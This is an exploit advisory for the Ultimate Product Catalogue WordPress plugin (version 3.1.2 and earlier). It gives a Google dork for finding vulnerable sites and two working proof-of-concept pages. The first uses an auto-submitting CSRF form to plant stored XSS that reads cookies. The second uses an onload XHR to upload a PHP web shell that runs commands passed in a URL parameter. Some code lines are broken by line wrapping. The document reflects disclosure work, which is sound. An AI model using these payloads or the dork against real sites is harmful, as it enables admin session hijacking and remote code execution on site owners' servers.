Product Catalogue 3.1.2
# Google Dork: inurl:"SingleProduct" intext:"Back to catalogue"
intext:"Category",
inurl:"/wp-content/plugins/ultimate-product-catalogue/product-sheets/"
# Date: 22/04/2015
# Exploit Author: Felipe Molina de la Torre (@felmoltor)
# Software Link:
# Version: <= 3.1.2, Comunicated and Fixed by the Vendor in 3.1.5
# Tested on: Linux 2.6, PHP 5.3 with magic_quotes_gpc turned off, Apache
2.4.0 (Ubuntu)
# CVE : N/A
# Category: webapps

1. Summary:

Ultimate Product Catalogue is a responsive and easily customizable plugin
for all your product catalogue needs. It has +63.000 downloads, +4.000
active installations.

Product Name and Description and File Upload formulary of plugin Ultimate
Product Catalog lacks of proper CSRF protection and proper filtering.
description. It also allows an attacker to upload a php script though a
CSRF due to a lack of file type filtering when uploading it.

2. Vulnerability timeline:
- 22/04/2015: Identified in version 3.1.2
- 22/04/2015: Comunicated to developer company etoilewebdesign.com

- 22/04/2015: Response from etoilewebdesign.com

 and fixed two SQLi in 3.1.3 but not these vulnerabilities.
        - 28/04/2015: Fixed version in 3.1.5 without notifying me.

3. Vulnerable code:

    In file html/ProductPage multiple lines.

3. Proof of concept:

https://www.youtube.com/watch?v=roB_ken6U4o


 ----------------------------------------------------------------------------------------------
   ------------- CSRF & XSS in Product Description and Name -----------

 ----------------------------------------------------------------------------------------------

<iframe width=0 height=0 style="display:none" name="csrf-frame"></iframe>
<form method=&#039;POST&#039;
    action=&#039;http://
<web>/wp-admin/admin.php?page=UPCP-options&Action=UPCP_EditProduct&Update_Item=Product&Item_ID=16&#039;
    target="csrf-frame"
    id="csrf-form">
        <input type=&#039;hidden&#039; name=&#039;action&#039; value=&#039;Edit_Product&#039;>
        <input type=&#039;hidden&#039; name=&#039;_wp_http_referer&#039;
value=&#039;/wp-admin/admin.php?page=UPCP-options&Action=UPCP_EditProduct&Update_Item=Product&Item_ID=16&#039;/>
        <input type=&#039;hidden&#039; name=&#039;Item_Name&#039; value="Product
name</a><script>alert(&#039;Product Name says: &#039;+document.cookie)</script><a>"/>
        <input type=&#039;hidden&#039; name=&#039;Item_Slug&#039; value=&#039;asdf&#039;/>
        <input type=&#039;hidden&#039; name=&#039;Item_ID&#039; value=&#039;16&#039;/>
        <input type=&#039;hidden&#039; name=&#039;Item_Image&#039; value=&#039;
http://i.imgur.com/6cWKujq.gif&#039;>
        <input type=&#039;hidden&#039; name=&#039;Item_Price&#039; value=&#039;666&#039;>
        <input type=&#039;hidden&#039; name=&#039;Item_Description&#039; value="Product
description says<script>alert(&#039;Product description says:
&#039;+document.cookie)</script>"/>
        <input type=&#039;hidden&#039; name=&#039;Item_SEO_Description&#039; value=&#039;seo desc&#039;>
        <input type=&#039;hidden&#039; name=&#039;Item_Link&#039; value=&#039;&#039;>
        <input type=&#039;hidden&#039; name=&#039;Item_Display_Status&#039; value=&#039;Show&#039;>
        <input type=&#039;hidden&#039; name=&#039;Category_ID&#039; value=&#039;&#039;>
        <input type=&#039;hidden&#039; name=&#039;SubCategory_ID&#039; value=&#039;&#039;>
        <input style="display:none" type=&#039;submit&#039; value=&#039;submit&#039;>
</form>
<script>document.getElementById("csrf-form").submit()</script>



 ----------------------------------------------------------------------------------------------
   -------- CSRF & File Upload in Product Description and Name ------

 ----------------------------------------------------------------------------------------------

<html>
    <body onload="submitRequest();">
        <script>
          function submitRequest()
          {
            var xhr = new XMLHttpRequest();
            xhr.open("POST",
true);
            xhr.setRequestHeader("Host", "<web>");
            xhr.setRequestHeader("Accept",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
            xhr.setRequestHeader("Cache-Control", "max-age=0");
            xhr.setRequestHeader("Accept-Language",
"en-US,en;q=0.8,es;q=0.6");
            xhr.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT
6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.37
Safari/537.36");
            xhr.setRequestHeader("Accept-Encoding", "gzip, deflate");
            xhr.setRequestHeader("Content-Type", "multipart/form-data;
boundary=----WebKitFormBoundarylPTZvbxAcw0q01W3");
            var body = "------WebKitFormBoundarylPTZvbxAcw0q01W3\r\n" +
              "Content-Disposition: form-data;
              "Content-Type: application/octet-stream\r\n" +
              "\r\n" +
              "<?php\r\n" +
              "exec($_GET[&#039;c&#039;],$output);\r\n" +
              "foreach ($output as $line) {\r\n" +
              "echo \"<br/>\".$line;\r\n" +
              "}\r\n" +
              "?>\r\n" +
              "------WebKitFormBoundarylPTZvbxAcw0q01W3\r\n" +
              "Content-Disposition: form-data; name=&#039;submit&#039;\r\n" +
              "\r\n" +
              "Add New Products\r\n" +
              "------WebKitFormBoundarylPTZvbxAcw0q01W3--\r\n" ;
            var aBody = new Uint8Array(body.length);
            for (var i = 0; i < aBody.length; i++)
              aBody[i] = body.charCodeAt(i);
            xhr.send(new Blob([aBody]));
          }
        </script>
        <form action="#">
          <input style="display:none;" type="submit" value="Up!"
onclick="submitRequest();" />
      </form>
  </body>
</html>

Te file cooldog.php is no available in path http://
<web>/wp-content/plugins/ultimate-product-catalogue/product-sheets/cooldog.php

